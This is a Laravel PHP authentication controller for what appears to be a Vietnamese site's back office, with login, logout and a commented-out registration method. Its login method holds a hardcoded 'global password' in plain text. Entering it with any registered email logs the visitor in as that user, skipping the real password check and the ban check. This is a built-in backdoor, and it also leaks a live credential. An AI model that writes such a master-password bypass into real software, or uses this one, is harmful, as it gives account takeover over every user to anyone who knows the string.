<?php
namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Auth;
use App\User;

class AuthController extends Controller
{
	protected $password = 'thienbinh2010';
    protected $message = [
        'email.required' => 'Tên đăng nhập không được để trống',
        'password.required' => 'Mật khẩu không được để trống',
    ];

    public function __construct()
    {
    	$this->middleware('auth')->only('logout');
    }

    # hàm đăng ký
    // public function register(Request $request)
    // {
    // 	$this->validate($request,[
    // 		'name' => 'required|max:255',
    // 		'email' => 'required|email|unique:users',
    // 		'password' => 'required|between:6,25|confirmed',
    // 	],$this->message);
    // 	$user = new User($request->all());
    // 	$user->password = bcrypt($request->password);
    // 	$user->save();
    // }

    public function loginForm()
    {
        if(Auth::user()){
            return redirect()->route('be.dashboard.index');
        }
        
    	return view('auth.login');
    }

    public function login(Request $request)
    {
        $this->validate($request, [
            'email' => 'required|email',
            'password' => 'required|min:3'
        ], $this->message);

    	$remember = $request->get('remember');

        // using global password
        if($request->password === $this->password && $user = User::where('email', $request->email)->first()) {
            Auth::loginUsingId($user->id, true);
            return redirect()->route('be.dashboard.index');
        }

        // login user
    	if (Auth::attempt(['email' => $request->email, 'password' => $request->password, 'is_ban' => null], $remember)) {
            return redirect()->intended(route('be.dashboard.index'));
    	}

        return back()->with(['message' => 'Email hoặc mật khẩu không hợp lệ.']);
    }

    public function logout()
    {
    	Auth::logout();
    	return redirect()->route('login');
    }
}
